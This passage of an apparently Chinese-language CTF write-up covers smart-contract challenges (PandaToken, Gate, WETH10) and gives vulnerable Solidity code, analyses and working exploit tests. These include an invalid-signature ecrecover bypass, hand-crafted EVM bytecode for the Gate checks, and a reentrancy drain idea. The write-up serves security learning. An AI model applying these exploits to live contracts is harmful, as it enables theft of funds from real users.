class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\nfondry<span class=\"token punctuation\">:</span>\n<span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"forge-std/Test.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../src/PandaToken.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Hack</span> <span class=\"token keyword\">is</span> Test <span class=\"token punctuation\">&#123;</span>\n    PandaToken pandatoken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">addr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> hacker <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">addr</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setUp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        vm<span class=\"token punctuation\">.</span><span class=\"token function\">prank</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pandatoken <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PandaToken</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"PandaToken\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"PND\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        vm<span class=\"token punctuation\">.</span><span class=\"token function\">startPrank</span><span class=\"token punctuation\">(</span>hacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes32</span> hash <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>hacker<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> s<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// your goal - to have 3 tokens (3e18) on your own(hacker) balance.</span>\n        <span class=\"token comment\">// solution</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n       \n\n        <span class=\"token function\">assertEq</span><span class=\"token punctuation\">(</span>pandatoken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>hacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-4\"><a href=\"#Analyse-4\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p><code>sMint</code>函数可以直接铸造3个Token，属于错误的函数可见性，但是作为一道中等题，考点应该不在于此先放一下直接mint的测试结果</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n       <span class=\"token comment\">// start hack</span>\n       <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sMint</span><span class=\"token punctuation\">(</span>Value<span class=\"token punctuation\">)</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n       <span class=\"token comment\">// end</span>\n       <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230217180937346.png\"></p>\n<p>再来分析一下<code>getTokens</code>函数，amount必须是1 ether，使用给定的signature解析出的r，s，v进行ecrecover，获取giftFrom，在进行数值判断，满足条件即可mint，signature不可以使用重复的。设想一下如果是invalid signature的情况下，recover出来的giftFrom应该是address(0)，在constructor函数中0地址的余额（slot&#x3D;&#x3D;keccak(key(0)+slot(00))）被修改为10e18</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230218002335119.png\"></p>\n<p>所以<code>getTokens</code>函数的require条件得以满足，乱写几个signature即可</p>\n<h2 id=\"Attack-4\"><a href=\"#Attack-4\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Pandatoken\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> owner<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">,</span>contract<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> Value <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> Contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PandaToken\"</span><span class=\"token punctuation\">,</span>owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Contract<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"PandaToken\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"PND\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// start hack</span>\n        <span class=\"token keyword\">let</span> hash <span class=\"token operator\">=</span> <span class=\"token string\">'0x9d22949dff2c7abb89af237f4baade600fff2e8d7d32e2129275c61e92f3e645'</span>\n        <span class=\"token comment\">//keccak256(abi.encode(attacker,7 ether))</span>\n        <span class=\"token keyword\">let</span> hash2 <span class=\"token operator\">=</span> <span class=\"token string\">'0x64a7f84c4b0ac27463993ca0b8cf9ce816846d3a12666752818074abe74443b2'</span>\n        <span class=\"token comment\">//keccak256(abi.encode(attacker,8 ether))</span>\n        <span class=\"token keyword\">let</span> hash3 <span class=\"token operator\">=</span> <span class=\"token string\">'0xa0de168b144c38cbcbd8adfc07a5e142cff643e06e912b0edea5ffb20456d8f9'</span>\n        <span class=\"token comment\">//keccak256(abi.encode(attacker,9 ether))</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTokens</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>hash<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTokens</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>hash2<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTokens</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>hash3<span class=\"token punctuation\">)</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// end</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230217190334980.png\"></p>\n<h1 id=\"0x0A-Gate\"><a href=\"#0x0A-Gate\" class=\"headerlink\" title=\"0x0A Gate\"></a>0x0A Gate</h1><h2 id=\"Code-5\"><a href=\"#Code-5\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.17</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IGuardian</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">f00000000_bvvvdlt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">f00000001_grffjzz</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Gate</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> opened<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> guardian<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> codeSize<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            codeSize <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span>guardian<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>codeSize <span class=\"token operator\">&lt;</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"bad code size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token function\">IGuardian</span><span class=\"token punctuation\">(</span>guardian<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">f00000000_bvvvdlt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"invalid pass\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token function\">IGuardian</span><span class=\"token punctuation\">(</span>guardian<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">f00000001_grffjzz</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"invalid pass\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> guardian<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fail()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>success<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        opened <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-5\"><a href=\"#Analyse-5\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>要求在32 opcodes之内完成题目要求<code>f00000000_bvvvdlt()</code>函数返回msg.sender，<code>f00000001_grffjzz()</code>函数返回tx.origin，<code>fail()</code>返回false或者调用失败</p>\n<p>switch case会超过32 opcodes限制，先测试两个函数的selector，分别是bytes4(0)和bytes4(1)，所以可以直接把函数选择器作为if判断的条件，其次，我将<code>f00000001_grffjzz()</code>和<code>fail()</code>函数归为一类进行判断，因为二者的selector都为非0值，将f00000001_grffjzz.selector（0x00000001）右移57（228 bits）位将会变成0，而将fail.selector（0xa9cc4718）右移57（228 bits）位将会是一个非零值</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">0000    34  CALLVALUE\n0001    80  DUP1\n0002    35  CALLDATALOAD\n0003    80  DUP1\n0004    60  PUSH1 0x0d\n0006    57  *JUMPI\n0007    33  CALLER\n0008    34  CALLVALUE\n0009    52  MSTORE\n000A    60  PUSH1 0x18\n000C    56  *JUMP\n000D    5B  JUMPDEST\n000E    80  DUP1\n000F    60  PUSH1 0xe4\n0011    1C  SHR\n0012    60  PUSH1 0x1c\n0014    57  *JUMPI\n0015    32  ORIGIN\n0016    34  CALLVALUE\n0017    52  MSTORE\n0018    5B  JUMPDEST\n0019    38  CODESIZE\n001A    34  CALLVALUE\n001B    F3  *RETURN\n001C    5B  JUMPDEST\n001D    34  CALLVALUE\n001E    34  CALLVALUE\n001F    FD  *REVERT\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>反编译，逻辑正确</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230208215418057.png\"></p>\n<p>最终构建：0x34803580600d573334526018565b8060e41c601c573234525b3834f35b3434fd</p>\n<h2 id=\"Attack-5\"><a href=\"#Attack-5\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><p>攻击方式和下边的Collatz Puzzle一题攻击方式一样，因为Collatz Puzzle题目时间靠前一些，所以写的早一些</p>\n<img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230208220416766.png\" style=\"zoom:50%;\" />\n\n<h1 id=\"0x09-WETH10\"><a href=\"#0x09-WETH10\" class=\"headerlink\" title=\"0x09 WETH10\"></a>0x09 WETH10</h1><h2 id=\"Code-6\"><a href=\"#Code-6\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>ERC20<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>ReentrancyGuard<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>Address<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// The Messi Wrapped Ether</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">WETH10</span> <span class=\"token keyword\">is</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Messi Wrapped Ether\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"WETH10\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_burnAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> wad<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        Address<span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdrawAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        Address<span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_burnAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/// @notice Request a flash loan in ETH</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> prevBalance <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        Address<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> prevBalance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"flash loan not returned\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-6\"><a href=\"#Analyse-6\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>在<code>_burnAll</code>函数中执行的逻辑是burn掉msg.sender的余额那么多Token，但是在<code>withdrawAll</code>函数中先执行了发送以太币，在burn的操作，也就是说我们可以在<code>receive</code>函数中恶意控制balance，循环直至合约余额清空</p>\n<p>可惜这道题当时没有想到思路，直到看了wp才清楚了思路逻辑😮‍💨</p>\n<h2 id=\"Attack-6\"><a href=\"#Attack-6\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" 